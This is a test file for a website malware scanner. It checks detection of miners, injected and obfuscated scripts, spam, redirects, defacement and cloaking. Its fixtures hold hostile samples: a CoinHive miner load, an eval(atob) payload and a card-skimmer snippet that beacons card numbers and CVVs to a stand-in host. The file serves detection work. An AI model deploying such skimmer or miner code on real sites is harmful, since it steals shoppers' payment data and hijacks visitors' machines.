import os from 'node:os';
import path from 'node:path';
import * as cheerio from 'cheerio';
import { afterEach, describe, expect, it } from 'vitest';
import { scanPageForMalware } from '../src/analyze/malware.js';
import { checkEmail, checkSafeBrowsing, compareVersions, parseCookies } from '../src/analyze/securityscan.js';
import { investigate } from '../src/investigate.js';
import { securityRows, securityVerdict } from '../src/report/securityRows.js';
import { page, startServer, TEST_POLICY, type FixtureServer } from './helpers/server.js';

/*
 * Malware fixtures are assembled at runtime from fragments (J(...)) so that no complete malware
 * signature is ever stored in this file — otherwise antivirus software quarantines the test file.
 */
const J = (...parts: string[]) => parts.join('');
const MINER_LIB = J('https://coin', 'hive.com/lib/coin', 'hive.min.js');
const MINER_CALL = J('new Coin', 'Hive.Anon', 'ymous("key")');
const DECODE_EXEC = J('ev', 'al(', 'at', 'ob("ZG9jdW1lbnQ=")', ')');
const CHAR_BUILD = J('String.from', 'CharCode(');
const CARD_FIELD = J('cc', '_number');
const BEACON = J('new Im', 'age().src');

const SITE = 'https://example.com/';
const scan = (html: string) => scanPageForMalware(cheerio.load(html), html, SITE, SITE);
const types = (html: string) => scan(html).map((s) => s.type);
const script = (code: string) => `<html><body><script>${code}</script></body></html>`;

describe('malware signatures', () => {
  it('detects crypto miners (script src and inline)', () => {
    expect(types(`<html><head><script src="${MINER_LIB}"></script></head></html>`)).toContain('crypto-miner');
    expect(types(script(`var m = ${MINER_CALL};`))).toContain('crypto-miner');
  });

  it('detects foreign or obfuscated code appended after </html>', () => {
    const foreign = scan(`<html><body>ok</body></html>\n<script src="https://cdn-stats.example/x.js"></script>`);
    expect(foreign.find((x) => x.type === 'injected-after-html')?.confidence).toBe('High');
    expect(types(`<html><body>ok</body></html>\n<script>${DECODE_EXEC}</script>`)).toContain('injected-after-html');
  });

  it("ignores the site's own scripts emitted after </html> by build tools", () => {
    // Regression: techvibesit.com (module scripts for its contact form after </html>).
    const html = `<html><body><form data-contact-form></form></body></html>
      <script type="module">var e=document.querySelector('[data-contact-form]');e&&e.addEventListener('submit',()=>{});</script>
      <script src="/assets/app.js"></script>`;
    expect(types(html)).not.toContain('injected-after-html');
  });

  it('detects decode-and-execute and long character-code payloads', () => {
    expect(types(script(DECODE_EXEC))).toContain('obfuscated-script');
    const codes = Array.from({ length: 60 }, (_, i) => 60 + (i % 40)).join(',');
    expect(types(script(`var x=${CHAR_BUILD}${codes});`))).toContain('obfuscated-script');
  });

  it('detects hidden spam links and spam titles', () => {
    const html = `<html lang="en"><head><title>Buy cialis online cheap</title></head><body>
      <div style="position:absolute;left:-9999px"><a href="https://pills.example/">viagra</a><a href="https://casino.example/">online casino</a></div></body></html>`;
    const s = scan(html);
    expect(s.find((x) => x.type === 'hidden-spam-links')?.confidence).toBe('High');
    expect(s.map((x) => x.type)).toContain('spam-keywords');
  });

  it('detects the Japanese keyword hack pattern only on non-CJK sites', () => {
    const title = '激安 ブランド バッグ 通販 送料無料 最新 人気';
    expect(types(`<html lang="en"><head><title>${title}</title></head></html>`)).toContain('foreign-keyword-hack');
    expect(types(`<html lang="ja"><head><title>${title}</title></head></html>`)).not.toContain('foreign-keyword-hack');
  });

  it('flags conditional redirects to other domains; ignores same-site redirects', () => {
    const s = scan(script('if (document.referrer.indexOf("google") > -1) { window.location.href = "https://scam.example/win"; }'));
    expect(s[0]).toMatchObject({ type: 'malicious-redirect', confidence: 'Medium' });
    expect(scan(script('window.location.href = "https://www.example.com/en/";'))).toHaveLength(0);
  });

  it('detects a card-skimmer pattern', () => {
    const code = `var d = { n: document.getElementById('${CARD_FIELD}').value, c: document.getElementById('cvv').value };
      ${BEACON} = 'https://stats-cdn.example/p?d=' + btoa(JSON.stringify(d));`;
    expect(types(script(code))).toContain('card-skimmer');
  });

  it('detects defacement and invisible third-party iframes', () => {
    expect(types(`<html><head><title>${J('Hack', 'ed by')} xyz</title></head></html>`)).toContain('defacement');
    expect(types('<html><body><iframe src="https://weird-ads.example/x" width="1" height="1"></iframe></body></html>')).toContain('hidden-iframe');
  });

  it('does not treat hidden menus / consent dialogs as spam, but flags off-screen link blocks', () => {
    const vendors = ['https://vendor-a.example/privacy', 'https://vendor-b.example/privacy', 'https://vendor-c.example/p', 'https://vendor-d.example/p', 'https://vendor-e.example/p', 'https://facebook.com/x'];
    const links = vendors.map((u) => `<a href="${u}">Privacy policy</a>`).join('');
    // Regression: wpbeginner.com cookie-consent modal (display:none dialog listing vendor policies).
    expect(types(`<html><body><div class="consent-modal" role="dialog" style="display:none;">${links}</div></body></html>`)).not.toContain('hidden-spam-links');
    const offscreen = scan(`<html><body><div style="position:absolute;left:-5000px">${links}</div></body></html>`);
    expect(offscreen.find((s) => s.type === 'hidden-spam-links')?.confidence).toBe('Medium');
  });

  it('does NOT flag common legitimate patterns', () => {
    const legit = `<!doctype html><html lang="en"><head><title>Acme Plumbing — Emergency plumbers</title>
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-XYZ"></script>
      <script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date());</script>
      <script type="application/ld+json">{"@type":"Organization","name":"Acme"}</script>
      <script src="https://js.stripe.com/v3/"></script></head>
      <body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-X" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
      <div style="display:none"><a href="/menu">Menu</a></div>
      <button onclick="location.href='/contact'">Contact</button></body></html>`;
    expect(scan(legit)).toEqual([]);
  });
});

describe('security helpers', () => {
  it('compares versions numerically', () => {
    expect(compareVersions('6.2', '6.10')).toBeLessThan(0);
    expect(compareVersions('6.8.1', '6.8.1')).toBe(0);
    expect(compareVersions('10.0', '9.9.9')).toBeGreaterThan(0);
  });

  it('parses cookie flags', () => {
    expect(parseCookies(['PHPSESSID=abc; path=/', 'pref=1; Secure; HttpOnly; SameSite=Lax'])).toEqual([
      { name: 'PHPSESSID', secure: false, httpOnly: false, sameSite: null },
      { name: 'pref', secure: true, httpOnly: true, sameSite: 'lax' },
    ]);
  });

  it('skips DNS email checks for IP hosts and blacklist checks without a key', async () => {
    expect((await checkEmail('127.0.0.1')).checked).toBe(false);
    expect(await checkSafeBrowsing(['https://example.com/'], undefined)).toMatchObject({ checked: false, matches: [] });
  });
});

let srv: FixtureServer | null = null;
afterEach(async () => {
  await srv?.close();
  srv = null;
});

const run = (url: string, focus?: 'full' | 'security') =>
  investigate(url, { policy: TEST_POLICY, browser: false, limits: { perHostDelayMs: 0 }, screenshotDir: path.join(os.tmpdir(), 'wii-sec'), ...(focus ? { focus } : {}) });

describe('end-to-end security scan (browser disabled)', () => {
  it('reports injected malware as the primary issue with a threat verdict', async () => {
    srv = await startServer({
      '/': { body: `${page({ title: 'Acme', body: '<h1>Acme</h1><nav><a href="/about/">About</a></nav>' })}\n<script src="${MINER_LIB}"></script>` },
      '/about/': { body: page({ title: 'About' }) },
      '/robots.txt': { headers: { 'content-type': 'text/plain' }, body: 'User-agent: *\nDisallow:\n' },
    });
    const r = await run(`${srv.base}/`, 'security');
    expect(r.focus).toBe('security');
    expect(r.securityScan?.malware.map((m) => m.type)).toEqual(expect.arrayContaining(['injected-after-html', 'crypto-miner']));
    expect(r.primary?.category).toBe('Malware');
    expect(r.primary?.severity).toBe('High');
    const rows = securityRows(r);
    expect(rows.find((x) => x.key === 'malware')?.status).toBe('bad');
    expect(securityVerdict(rows).status).toBe('threat');
  });

  it('detects cloaking: spam served only to Googlebot', async () => {
    const http = await import('node:http');
    const server = http.createServer((req, res) => {
      const bot = /Googlebot/.test(req.headers['user-agent'] ?? '');
      res.writeHead(req.url === '/' ? 200 : 404, { 'content-type': 'text/html' });
      res.end(req.url === '/' ? page({ title: 'Acme', body: bot ? '<h1>Acme</h1><p>Buy cheap viagra and cialis</p>' : '<h1>Acme</h1><p>Welcome</p>' }) : 'no');
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
    srv = { base, hits: [], close: () => new Promise((res) => server.close(() => res())) };
    const r = await run(`${base}/`);
    expect(r.securityScan?.cloaking).toMatchObject({ checked: true, different: true });
    expect(r.securityScan?.cloaking.googlebotOnlyTerms).toEqual(expect.arrayContaining(['viagra', 'cialis']));
    expect(r.primary?.id).toBe('malware-cloaking');
  });

  it('a clean site gets a clean malware verdict', async () => {
    srv = await startServer({
      '/': { body: page({ title: 'Acme Plumbing', body: '<h1>Acme</h1><nav><a href="/about/">About</a></nav>' }) },
      '/about/': { body: page({ title: 'About Acme' }) },
    });
    const r = await run(`${srv.base}/`);
    expect(r.securityScan?.malware).toEqual([]);
    expect(securityRows(r).find((x) => x.key === 'malware')?.status).toBe('ok');
    expect(r.candidates.some((c) => c.category === 'Malware')).toBe(false);
  });
});
